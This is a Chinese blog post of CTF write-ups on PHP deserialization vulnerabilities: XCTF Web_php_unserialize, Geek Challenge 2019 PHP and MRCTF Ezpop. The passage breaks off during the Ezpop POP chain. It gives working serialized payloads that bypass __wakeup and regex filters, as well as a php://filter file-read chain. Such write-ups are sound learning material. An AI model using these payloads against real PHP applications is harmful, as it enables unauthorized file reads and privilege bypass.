        <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php中常用的几种魔术方法和触发条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct ：当一个对象创建时被调用</span><br><span class="line">__destruct ：当一个对象销毁时被调用</span><br><span class="line">__toString ：当一个类或对象被当作一个字符串被调用</span><br><span class="line">__wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发</span><br><span class="line">__sleep ：当一个对象使用 serialize 时触发，序列化时触发</span><br><span class="line">__get ：当一个对象读取不可访问属性的值时触发</span><br><span class="line">__set ：当一个对象在给不可访问属性赋值时</span><br><span class="line">__isset ：当一个对象当对不可访问属性调用 <span class="keyword">isset</span> 或 <span class="keyword">empty</span> 时触发</span><br><span class="line">__unset ：当一个对象对不可访问属性调用 <span class="keyword">unset</span> 时触发</span><br><span class="line">__invoke ：当一个对象尝试以调用函数的方式调用一个对象时触发</span><br><span class="line">__set_state ：当一个对象调用 var_export 导出类时，此静态方法会被调用</span><br><span class="line">__call ：当一个对象在对象上下文中调用不可访问的方法时触发 </span><br><span class="line">__callStatic ：当一个对象在静态上下文中调用不可访问的方法时触发</span><br></pre></td></tr></table></figure><p>不同属性之间的区别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  变量（公有） </span><br><span class="line">直接将变量名反序列化出来 </span><br><span class="line"><span class="keyword">protected</span>  变量（受保护） </span><br><span class="line">\x00 + * + \x00 + 变量名 </span><br><span class="line"><span class="keyword">private</span>  变量（私有） </span><br><span class="line">\x00 + 类名 + \x00 + 变量名</span><br></pre></td></tr></table></figure><hr><h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p>感谢xctf平台，题目<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank" rel="noopener">链接</a></p><p>题目代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由代码可知，题目提供了一个<code>var</code>参数给我们进行<code>get</code>传参，首先先对<code>var</code>进行<code>base64</code>解码，然后进入<code>if</code>判断语句，若判断条件不成立就进入<code>else</code>，进行<code>unserialize</code>操作，题目提供了一个<code>Demo</code>类来进行序列化操作，且其中的<code>__destruct</code>方法可以将代码显示出来，题目提示了<code>the secret is in the fl4g.php</code>，flag应该就在<code>fl4g.php</code>中，于是寻找突破点</p><p>题目限制条件：</p><blockquote><p>preg_match(‘/[oc]:\d+:/i’, $var)：对传入的var经过base64解密后的字符串进正则匹配，来防止反序列化操作</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>是用在反序列化操作中。<code>unserialize()</code>会检查存在一个<code>__wakeup()</code>方法。如果存在，则先会调用<code>__wakeup()</code>方法，在这里这个函数会将<code>file</code>赋值为<code>index.php</code></p></blockquote><p>可是这两种方法都可以进行绕过：</p><blockquote><p>preg_match()：这个正则匹配函数是用来防止反序列化的开头的，如<code>O:4:</code>即可匹配上，但可以用+进行绕过，可以写成<code>O:+4:</code>反序列化函数一样识别</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。例如<code>O:4:&quot;Demo&quot;:1:</code>，Demo后面的1表示的就是类的属性个数，将1改大即可跳过<code>__wakeup</code>函数的执行</p></blockquote><p>于是构造payload：<code>O:+4:&quot;Demo&quot;:4:{s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;}</code></p><p>注意<code>file</code>前面的<code>Demo</code>左右需要有<code>%00</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">序列化后：</span><br><span class="line">v1 表示 <span class="keyword">public</span>   %<span class="number">00</span>Demo%<span class="number">00</span>v2 表示 <span class="keyword">private</span>(Demo为类名)   %<span class="number">00</span>*%<span class="number">00</span>v3 表示 <span class="keyword">protected</span>  v1,v2,v3为属性名</span><br></pre></td></tr></table></figure><p><code>base64</code>编码后<code>TzorNDoiRGVtbyI6NDp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><blockquote><p>参考：<br><a href="https://www.jianshu.com/p/8f498198fc3d" target="_blank" rel="noopener">php序列化与反序列化入门</a><br><a href="https://www.cnblogs.com/kacha886/p/9115503.html" target="_blank" rel="noopener">魔术方法<code>__sleep()</code>,<code>__wakeup()</code></a><br><a href="http://blog.sina.com.cn/s/blog_15ebf299a0102xnug.html" target="_blank" rel="noopener">__wakeup()函数漏洞以及实际漏洞分析</a></p></blockquote><p>PS：php代码审计是个大坑，刚接触的话上手还是有点困难，还是要多看看php代码，需要有面向对象编程的思想，否则代码量大的就比较难入手；序列化算是一个重点了吧，原来就接触过好多这样的题，但都不怎么看得懂，所以就都略过了，现在学了点php基础勉强能够看的懂，总之多看多思考，慢慢来吧。</p><hr><h3 id="极客大挑战-2019—PHP"><a href="#极客大挑战-2019—PHP" class="headerlink" title="极客大挑战-2019—PHP"></a>极客大挑战-2019—PHP</h3><p>界面：<br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200324104326758.png" alt=""></p><p>题目提示网站有备份，于是访问<code>www.zip</code>，得到网页源码：</p><p>index.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  ......</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    ......</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"world"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;"</span>&gt;</span>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;"</span>&gt;</span>不愧是我！！！</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;"</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span></span><br><span class="line"><span class="php">    $select = $_GET[<span class="string">'select'</span>];</span></span><br><span class="line"><span class="php">    $res=unserialize(@$select);</span></span><br><span class="line"><span class="php">    <span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: absolute;bottom: 5%;width: 99%;"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">style</span>=<span class="string">"font:italic 15px Georgia,serif;color:white;"</span>&gt;</span> Syclover @ cl4y<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">src</span>=<span class="string">"index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到index.php中有对get的select参数进行反序列化操作，并且题目给了一个class.php中的Name类，于是构造反序列化条件：</p><p>观察chass.php代码发现只要令password=100，username=admin，且绕过__wakeup函数即可，于是得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">"%00Name%00username"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"%00Name%00password"</span>;s:<span class="number">3</span>:<span class="string">"100"</span>;&#125;</span><br></pre></td></tr></table></figure><p>传入即可</p><hr><h3 id="MRCTF—Ezpop"><a href="#MRCTF—Ezpop" class="headerlink" title="MRCTF—Ezpop"></a>MRCTF—Ezpop</h3><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一步步审计代码</p><p>首先看到最后的if语句，题目给出了一个可以get的pop参数，随后对其进行反序列化操作，于是直接想到利用反序列化漏洞，再往上看找利用点</p><p>题目给出了三个类，观察可利用点可以在<code>Modifier</code>对象中看到一个include函数，这里就可以利用文件包含从而达到任意文件读取的效果，具体方法只要令<code>include</code>的<code>value</code>为<code>php://filter/read=convert.base64-encode/resource=./flag.php</code>即可读取flag文件，所以就需要想办法利用这个点</p><p>可用看到<code>Modifier</code>对象中有一个<code>__invoke</code>方法代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面调用了可触发条件的<code>append</code>方法，而此方法中的<code>var</code>属性是可控的，于是就可以直接利用<code>var</code>属性来调用<code>append</code>方法，从而达到文件包含的效果，初步构造序列化参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Modifier;</span><br></pre></td></tr></table></figure><p>而<code>__invoke</code>函数的使用方法是当尝试以调用函数的方法调用一个对象时触发，于是找到可触发条件，可以在下面的<code>Test</code>对象中看到一个<code>__get</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">    $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">    <span class="keyword">return</span> $function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法里面返回的参数刚好可以作为函数条件调用一个对象，于是可以利用此方法调用<code>Modifier</code>对象，只需令里面的参数<code>p</code>为创建的新的<code>Modifier</code>对象即可，就可以触发<code>__invoke</code>函数，而<code>Test</code>对象中的参数<code>p</code>是可控的，于是就可以进一步构造序列化参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Modifier;</span><br><span class="line">$b = <span class="keyword">new</span> Test;</span><br><span class="line">$b-&gt;p = $a;</span><br></pre></td></tr></table></figure><p>随后就需要想办法如何触发<code>__get</code>函数，<code>__get</code>函数的触发条件是当对象读取不可访问的属性的时候触发，于是就需要构造一个不可访问的属性来触发此函数，当然这个属性在对象内部肯定是不存在的，于是就要到外部去找，可以看到<code>Show</code>对象中的<code>__toString</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就可以构造<code>str</code>参数为一个<code>Test</code>对象，然后调用<code>source</code>属性，而<code>Test</code>对象中是没有<code>source</code>这个属性的，这样就可以触发对象中的<code>__get</code>方法，而<code>Show</code>对象中的<code>str</code>属性是可控的，于是就可以接着构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Modifier;</span><br><span class="line">$b = <span class="keyword">new</span> Test;</span><br><span class="line">$b-&gt;p = $a;</span><br><span class="line">$c = <span class="keyword">new</span> Show;</span><br><span class="line">$c-&gt;str = $b</span><br></pre></td></tr></table></figure><p>然后就该想想<code>__toString</code>方法该如何触发了，<code>__toString</code>方法触发条件是当对象被当做一个字符串被调用，于是寻找触发点可以在函数下方看到一个<code>__wakeup</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">    &#125;</span><br><span 